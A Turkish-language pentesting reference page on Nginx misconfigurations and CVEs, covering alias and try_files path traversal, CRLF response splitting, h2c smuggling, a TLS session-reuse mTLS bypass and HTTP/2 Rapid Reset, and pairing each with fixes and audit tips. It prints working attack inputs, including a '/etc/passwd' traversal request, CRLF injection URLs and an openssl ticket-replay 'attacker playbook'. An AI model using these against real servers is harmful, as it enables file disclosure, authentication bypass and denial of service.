# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Eksik root location <a href="#missing-root-location" id="missing-root-location"></a>

Nginx sunucusunu yapılandırırken, **root directive** dosyaların sunulduğu temel dizini tanımlayarak kritik bir rol oynar. Aşağıdaki örneği inceleyin:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Bu yapılandırmada `/etc/nginx` root dizini olarak belirlenmiştir. Bu ayar, `/hello.txt` gibi belirtilen root dizini içindeki dosyalara erişime izin verir. Ancak sadece belirli bir location (`/hello.txt`) tanımlandığını belirtmek önemlidir. Root konumu için (`location / {...}`) herhangi bir yapılandırma yoktur. Bu eksiklik, root direktifinin küresel olarak uygulanması anlamına gelir; bu da kök yolu `/` için yapılan isteklerin `/etc/nginx` altındaki dosyalara erişmesine olanak tanır.

Bu yapılandırmadan kaynaklanan kritik bir güvenlik endişesi vardır. Basit bir `GET` isteği, örneğin `GET /nginx.conf`, `/etc/nginx/nginx.conf` konumunda bulunan Nginx yapılandırma dosyasını sunarak hassas bilgileri açığa çıkarabilir. root'u `/etc` gibi daha az hassas bir dizine ayarlamak bu riski azaltabilir; yine de diğer yapılandırma dosyalarına, erişim günlüklerine ve HTTP basic authentication için kullanılan şifrelenmiş kimlik bilgilerine istemeden erişime izin verebilir.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx'in yapılandırma dosyalarında, "location" direktiflerinin yakından incelenmesi gerekir. Local File Inclusion (LFI) olarak bilinen bir zafiyet, aşağıdakine benzeyen bir yapılandırma yoluyla kazara oluşturulabilir:
```
location /imgs {
alias /path/images/;
}
```
Bu yapılandırma, sunucunun `/imgs../flag.txt` gibi istekleri amaçlanan dizinin dışındaki dosyalara erişme girişimi olarak yorumlaması nedeniyle LFI saldırılarına açıktır; bu istek fiilen `/path/images/../flag.txt` olarak çözülür. Bu zafiyet, saldırganların web üzerinden erişilememesi gereken dosyaları sunucunun dosya sistemi üzerinden almasına olanak tanır.

Bu zafiyeti hafifletmek için yapılandırma şu şekilde ayarlanmalıdır:
```
location /imgs/ {
alias /path/images/;
}
```
Daha fazla bilgi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix testleri:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Güvensiz yol kısıtlaması <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Aşağıdaki sayfayı, şu tür direktifleri nasıl atlatacağınızı öğrenmek için inceleyin:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Güvensiz değişken kullanımı / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Zafiyetli değişkenler `$uri` ve `$document_ur`i ve bu, `$request_uri` ile değiştirilerek düzeltilebilir.
>
> Bir regex de şu şekilde zafiyetli olabilir:
>
> `location ~ /docs/([^/])? { … $1 … }` - Zafiyetli
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Zafiyetli değil (boşlukları kontrol ediyor)
>
> `location ~ /docs/(.*)? { … $1 … }` - Zafiyetli değil

Aşağıdaki örnek Nginx yapılandırmasındaki bir zafiyeti göstermektedir:
```
location / {
return 302 https://example.com$uri;
}
```
HTTP isteklerinde \r (Carriage Return) ve \n (Line Feed) karakterleri yeni satır karakterlerini belirtir ve bunların URL-encoded halleri `%0d%0a` olarak gösterilir. Bu karakterleri hatalı yapılandırılmış bir sunucuya yapılan bir isteğe (ör. `http://localhost/%0d%0aDetectify:%20clrf`) dahil etmek, sunucunun `Detectify` adlı yeni bir header oluşturmasına neden olur. Bu, $uri değişkeninin URL-encoded yeni satır karakterlerini çözmesi nedeniyle olur ve yanıtın beklenmeyen bir header içermesine yol açar:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection ve response splitting riskleri hakkında daha fazla bilgi edinin: [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Ayrıca bu teknik [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) bazı kırılabilir örnekler ve tespit mekanizmaları ile anlatılmıştır. Örneğin, bu yanlış yapılandırmayı blackbox perspektifinden tespit etmek için şu istekleri kullanabilirsiniz:

- `https://example.com/%20X` - Herhangi bir HTTP kodu
- `https://example.com/%20H` - 400 Bad Request

Eğer zafiyetliyse, ilki "X" herhangi bir HTTP methodu olduğu için dönecek ve ikincisi H geçerli bir method olmadığı için hata dönecektir. Yani sunucu şöyle bir şey alacak: `GET / H HTTP/1.1` ve bu hata tetikleyecektir.

Diğer tespit örnekleri şunlar olabilir:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Herhangi bir HTTP kodu
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

O konuşmada sunulan bazı kırılgan konfigürasyon örnekleri şunlardı:

- Dikkat edin: **`$uri`** son URL'de olduğu gibi ayarlanmış
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Tekrar **`$uri`**'nin URL'de olduğunu fark edin (bu sefer bir parametre içinde)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Şimdi AWS S3'te
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Herhangi bir variable

Belirli koşullar altında **kullanıcı tarafından sağlanan veri**nin bir **Nginx variable** olarak işlenebileceği keşfedildi. Bu davranışın nedeni hâlâ biraz belirsizdir; ancak nadir değildir ve doğrulanması da basit değildir. Bu anomali, HackerOne'da yayımlanan bir güvenlik raporunda vurgulandı ve raporu [here](https://hackerone.com/reports/370094) adresinden görüntüleyebilirsiniz. Hata mesajının daha detaylı incelenmesi, bunun [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) içinde meydana geldiğini ortaya koydu ve sorunun kaynağı olarak Server Side Includes (SSI) belirlendi.

Bu yanlış yapılandırmayı **tespit etmek** için, değişkenin yazdırılıp yazdırılmadığını test etmek amacıyla bir referer header ayarlamayı içeren aşağıdaki komut çalıştırılabilir:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Bu yanlış yapılandırmayı sistemler genelinde tarayan kontroller, bir kullanıcının Nginx değişkenlerini yazdırabildiği birden fazla örneği ortaya çıkardı. Ancak, savunmasız örnek sayısındaki azalma, bu sorunu düzeltme çabalarının bir ölçüde başarılı olduğunu gösteriyor.

### try_files ile $URI$ARGS değişkenlerini kullanma

Aşağıdaki Nginx yanlış yapılandırması bir LFI vulnerability'ye yol açabilir:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Yapılandırmamızda, belirtilen sırayla dosya varlığını kontrol etmek için kullanılan `try_files` direktifi bulunuyor. Nginx bulduğu ilk dosyayı sunar. `try_files` direktifinin temel sözdizimi aşağıdaki gibidir:
```
try_files file1 file2 ... fileN fallback;
```
Nginx, belirtilen sırayla her dosyanın varlığını kontrol eder. Bir dosya mevcutsa, hemen sunulur. Belirtilen dosyaların hiçbiri yoksa, istek başka bir URI veya özel bir hata sayfası olabilecek yedek seçeneğe iletilir.

Ancak, bu yönergede `$uri$args` değişkenleri kullanıldığında, Nginx istek URI'si ile sorgu dizesindeki argümanların birleşimini karşılayan bir dosya aramaya çalışır. Bu nedenle bu yapılandırmayı suistimal edebiliriz:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Aşağıdaki payload ile:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Payload'ımızı kullanarak, Nginx konfigürasyonunda tanımlı root dizininden kaçıp `/etc/passwd` dosyasını yüklüyoruz. Debug loglarında Nginx'in dosyaları nasıl denediğini görebiliriz:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
Yukarıda belirtilen yapılandırma kullanılarak Nginx'e karşı PoC:
![Example burp request](../../images/nginx_try_files.png)

## Ham backend yanıtının okunması

Nginx, `proxy_pass` aracılığıyla backend tarafından üretilen hataları ve HTTP header'larını yakalayarak dahili hata mesajları ve header'ları gizlemeyi sağlayan bir özellik sunar. Bu, Nginx'in backend hatalarına özel error sayfaları servis etmesiyle gerçekleştirilir. Ancak Nginx geçersiz bir HTTP isteğiyle karşılaştığında sorunlar ortaya çıkar. Böyle bir istek alındığı gibi backend'e iletilir ve backend'in ham yanıtı Nginx müdahalesi olmadan doğrudan istemciye gönderilir.

uWSGI uygulaması içeren bir örnek senaryoya bakalım:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Bunu yönetmek için Nginx yapılandırmasında belirli direktifler kullanılır:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Bu directive, durum kodu 300'den büyük olan backend cevapları için Nginx'in özel bir yanıt sunmasını sağlar. Örneğimizdeki uWSGI application için bir `500 Error` yanıtının yakalanıp Nginx tarafından işlenmesini garanti eder.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Adından da anlaşılacağı üzere, bu directive istemciye belirli HTTP header'larını gizler ve gizliliği ile güvenliği artırır.

Geçerli bir `GET` isteği yapıldığında, Nginx isteği normal şekilde işler ve gizli header'ları açığa çıkarmadan standart bir hata yanıtı döner. Ancak geçersiz bir HTTP isteği bu mekanizmayı atlatır ve raw backend yanıtlarının, gizli header'lar ve hata mesajları dahil olmak üzere, açığa çıkmasına neden olur.

## merge_slashes kapalı olarak ayarlandığında

Varsayılan olarak, Nginx'in **`merge_slashes` directive**i **`on`** olarak ayarlanmıştır; bu, bir URL içindeki birden fazla ileri eğik çizgiyi tek bir eğik çizgiye sıkıştırır. Bu özellik, URL işlemlerini basitleştirirken, Nginx arkasındaki uygulamalarda özellikle local file inclusion (LFI) açıklarına yatkın uygulamalarda zafiyetleri gizleyebilir. Güvenlik uzmanları Danny Robinson ve Rotem Bar, özellikle Nginx reverse-proxy olarak davrandığında bu varsayılan davranışın potansiyel risklerini vurgulamışlardır.

Bu tür riskleri azaltmak için, bu zafiyetlere yatkın uygulamalar için `merge_slashes` directive'ini kapalı (off) olarak ayarlamanız önerilir. Bu, Nginx'in istekleri URL yapısını değiştirmeden uygulamaya iletmesini sağlar ve böylece altta yatan güvenlik sorunlarının maskelenmesini önler.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Yanıt Başlıkları**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), web sunucusundan gelen yanıtta mevcut olmaları durumunda Nginx proxy davranışını değiştirebilecek bazı header'lar vardır. Bunları [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) bölümünde kontrol edebilirsiniz:

- `X-Accel-Redirect`: Belirtilen bir konuma dahili olarak bir request yönlendirmesi yapmak üzere Nginx'i işaret eder.
- `X-Accel-Buffering`: Nginx'in yanıtı bufferlayıp bufferlamayacağını kontrol eder.
- `X-Accel-Charset`: X-Accel-Redirect kullanıldığında yanıt için karakter setini ayarlar.
- `X-Accel-Expires`: X-Accel-Redirect kullanıldığında yanıtın geçerlilik süresini ayarlar.
- `X-Accel-Limit-Rate`: X-Accel-Redirect kullanıldığında yanıtlar için transfer hızını sınırlar.

Örneğin, `X-Accel-Redirect` header'ı nginx içinde dahili bir **redirect**a neden olur. Bu yüzden `root /` gibi bir nginx konfigürasyonu ve web sunucusundan gelen `X-Accel-Redirect: .env` gibi bir yanıt olması durumunda nginx, `/.env` içeriğini gönderir (Path Traversal).

### **Default Value in Map Directive**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Without a `default`, a **kötü niyetli kullanıcı** `/map-poc` içinde bir **tanımsız URI**'ye erişerek güvenliği atlatabilir. [Nginx kılavuzu](https://nginx.org/en/docs/http/ngx_http_map_module.html) bu tür sorunları önlemek için bir **default değeri** belirlemenizi önerir.

### **DNS Spoofing Vulnerability**

Nginx'e karşı DNS spoofing belirli koşullar altında mümkündür. Bir saldırgan Nginx'in kullandığı **DNS server**'ı biliyorsa ve DNS sorgularını yakalayabiliyorsa, DNS kayıtlarını spooflayabilir. Ancak Nginx, DNS çözümlemesi için **localhost (127.0.0.1)** olarak yapılandırıldıysa bu yöntem etkisizdir. Nginx aşağıdaki şekilde bir DNS server belirtmeye izin verir:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` ve `internal` Yönergeleri**

**`proxy_pass`** yönergesi, gelen istekleri dahili veya harici diğer sunuculara yönlendirmek için kullanılır. **`internal`** yönergesi belirli location'ların yalnızca nginx içinde erişilebilir olmasını sağlar. Bu yönergeler tek başlarına zafiyet olmasalar da, yapılandırmaları güvenlik açıklarını önlemek için dikkatle incelenmelidir.

## proxy_set_header Upgrade & Connection

Eğer nginx sunucusu Upgrade ve Connection header'larını iletecek şekilde yapılandırılmışsa, korumalı/dahili endpoint'lere erişmek için bir [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) gerçekleştirilebilir.

> [!CAUTION]
> Bu zafiyet, bir saldırganın **`proxy_pass` endpoint`i ile doğrudan bağlantı kurmasına** (`http://backend:9999` bu durumda) ve içeriğinin nginx tarafından kontrol edilmeyecek olmasına izin verir.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Belirtmek gerekir ki, `proxy_pass` belirli bir **path** örneğin `http://backend:9999/socket.io`'e işaret etse bile bağlantı `http://backend:9999` ile kurulacaktır; bu nedenle iç endpoint içinde başka herhangi bir path ile **iletişim kurabilirsiniz**. Yani proxy_pass URL'sinde bir path belirtilmiş olması önemli değildir.

## HTTP/3 QUIC modülü uzaktan DoS & leak (2024)

2024 yılında Nginx, CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 ve CVE-2024-35200 bildirimlerinde deneysel `ngx_http_v3_module` derlendiğinde ve bir `listen ... quic` soketi açığa çıktığında tek bir **tek kötü niyetli QUIC session**'ın worker süreçlerini çökertebileceğini veya bellek leak'i oluşturabileceğini gösterdi. Etkilenen derlemeler 1.25.0–1.25.5 ve 1.26.0 iken, 1.27.0/1.26.1 düzeltmeleri içerir; bellek disclosure (CVE-2024-34161) ayrıca hassas verilerin ortaya çıkması için 4096 bayttan büyük MTU'lar gerektirir (ayrıntılar aşağıdaki 2024 nginx advisory'sinde).

**Recon & exploitation hints**

- HTTP/3 opt-in'dir, bu yüzden `Alt-Svc: h3=":443"` yanıtlarını tarayın veya UDP/443 üzerinde QUIC handshake'lerini brute-force edin; doğrulandıktan sonra handshake ve STREAM framelerini custom `quiche-client`/`nghttp3` payload'larıyla fuzz'layarak worker çökmelerini tetikleyin ve log leakage zorlayın.
- Hedef desteğini hızlıca fingerprint etmek için:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS oturum yeniden kullanımıyla istemci sertifika doğrulamasının atlatılması (CVE-2025-23419)

Şubat 2025'te yayımlanan bir advisory, OpenSSL ile derlenmiş nginx 1.11.4–1.27.3 sürümlerinin bir isim tabanlı virtual host'tan alınan **TLS 1.3 oturumunu yeniden kullanmaya** izin verdiğini ortaya koydu; böylece sertifika gerektirmeyen bir host ile müzakere eden bir istemci, ticket/PSK'i yeniden oynatarak `ssl_verify_client on;` ile korunan bir vhost'a atlayabilir ve mTLS'i tamamen atlayabilir. Hata, birden fazla virtual host aynı TLS 1.3 oturum önbelleğini ve ticket'ları paylaştığında tetiklenir (aşağıda referans verilen 2025 nginx advisory'sine bakınız).

**Saldırgan playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Hedef savunmasızsa, ikinci handshake istemci sertifikası sunulmadan tamamlanır ve korunmuş konumları ifşa eder.

**Ne denetlenmeli**

- Farklı `server_name` bloklarının `ssl_session_cache shared:SSL` ile `ssl_session_tickets on;` ayarlarını paylaşması.
- mTLS bekleyen Admin/API bloklarının paylaşılan oturum önbelleği ve bilet ayarlarını herkese açık hostlardan miras alması.
- Vhost izolasyonunu dikkate almadan TLS 1.3 session resumption'ı global olarak etkinleştiren otomasyon (ör. Ansible rolleri).

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

HTTP/2 Rapid Reset attack (CVE-2023-44487) hâlâ nginx'i etkiler; operatörler `keepalive_requests` veya `http2_max_concurrent_streams` değerlerini varsayılanların ötesine yükselttiğinde: bir saldırgan tek bir HTTP/2 bağlantısı açar, binlerce stream ile onu doldurur ve hemen `RST_STREAM` frame'leri gönderir; böylece concurrency ceiling hiç ulaşılmadan CPU teardown mantığında tükenmeye devam eder. Nginx varsayılanları (128 concurrent streams, 1000 keepalive requests) etki alanını küçük tutar; bu limitleri "önemli ölçüde" artırmak, tek bir istemciden bile worker'ları starve etmeyi kolaylaştırır (aşağıda referans verilen F5 write-up'ına bakın).

**Tespit ipuçları**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hostlar, bu yönergeler için alışılmadık derecede yüksek değerler gösteriyorsa birincil hedeflerdir: tek bir HTTP/2 istemcisi stream oluşturma ve anında `RST_STREAM` çerçeveleri döngüsüyle CPU'yu meşgul tutabilir ve eşzamanlılık sınırını tetiklemeden çalışma devam ettirebilir.

## Kendiniz deneyin

Detectify, bu makalede tartışılan bazı yanlış yapılandırmalarla kendi zafiyetli Nginx test sunucunuzu Docker kullanarak kurabileceğiniz bir GitHub deposu oluşturdu ve bunları kendiniz bulmayı deneyebilirsiniz!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statik Analiz araçları

### [GIXY](https://github.com/yandex/gixy)

Gixy, Nginx yapılandırmasını analiz etmek için bir araçtır. Gixy'nin temel amacı güvenlik yanlış yapılandırmalarını önlemek ve kusur tespitini otomatikleştirmektir.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner, yaygın Nginx yanlış yapılandırmalarını ve zafiyetleri aramak için basit bir araçtır.

## Referanslar

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
